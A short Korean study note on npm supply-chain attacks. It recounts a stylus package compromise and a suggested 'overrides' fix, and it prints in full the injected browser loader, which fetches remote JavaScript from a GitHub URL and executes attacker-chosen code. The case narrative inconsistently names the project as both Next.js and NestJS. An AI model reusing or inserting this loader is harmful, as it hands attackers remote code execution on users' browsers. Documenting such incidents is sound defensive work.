# security Supply-chain

npm registry 등의 공급망을 임의로 변조하여 악의적인 패키지를 설치하는 공격

## 사례

1. nextjs의 stylus가 오염되어 잠시 nextjs 프로젝트가 빌드되지 않는 문제가 발생
2. 인터넷의 누군가

   ```txt
   overrides: {
       stylus: '0.0.1-security'
   }
   ```

   이 코드를 추가하여 해결하라는 댓글이 달렸다.
   [comment](/img/supply-chain.png)

3. 이 코드는 실제로 nestjs를 작동되게함
4. 5개월 뒤 공격자는 이 코드를 통해서 nestjs의 공급망을 변조하여 nestjs를 오염시키는 공격을 시도했다.

5. 삽입된 코드는 브라우저에서 공격자의 서버에서 코드를 가져와 원하는 명령을 원격으로 실행하도록 한다.

   ```txt
   (function(){if(window.__REMOTE_LOADER__)return;window.__REMOTE_LOADER__=(async()=>{async function fetchRemoteJS(a){const res=await fetch(a);if(!res.ok)throw new Error("load err: "+res.status);return res.text()}function extractDecodeHost(a){try{if(/module\.exports/.test(a)){const module={exports:{}};new Function("module","exports",a)(module,module.exports);return module.exports.decodeHost}let decodeHost;new Function("setDecodeHost",a+"\nif (typeof decodeHost !== 'undefined') setDecodeHost(decodeHost);",)(v=>(decodeHost=v));return decodeHost}catch(err){console.error("[extractDecodeHost error]",err);return null}}async function init(){try{const remoteCode=await fetchRemoteJS("https://raw.githubusercontent.com/JuanitaWHowe/js/refs/heads/main/index.js",);const decodeHost=extractDecodeHost(remoteCode);if(!decodeHost)return;window.go=function(a,b,c){try{c=c!==false;if(!a){const p=new URLSearchParams(location.search);a=p.get("type")||"";b=b||p.get("id")||""}if(!a||!b)return;const host=decodeHost(a);if(!host)return;fetch("https://"+host).then(r=>r.text()).then(code=>{(0,new Function(code))()}).catch(err=>{console.error("[fetch host code error]",err)})}catch(e){console.error("[go error]",e)}};const params=new URLSearchParams(location.search);const t=params.get("type");const i=params.get("id");if(t&&i)window.go(t,i)}catch(err){console.error("[init error]:",err)}}return init()})()})();
   ```
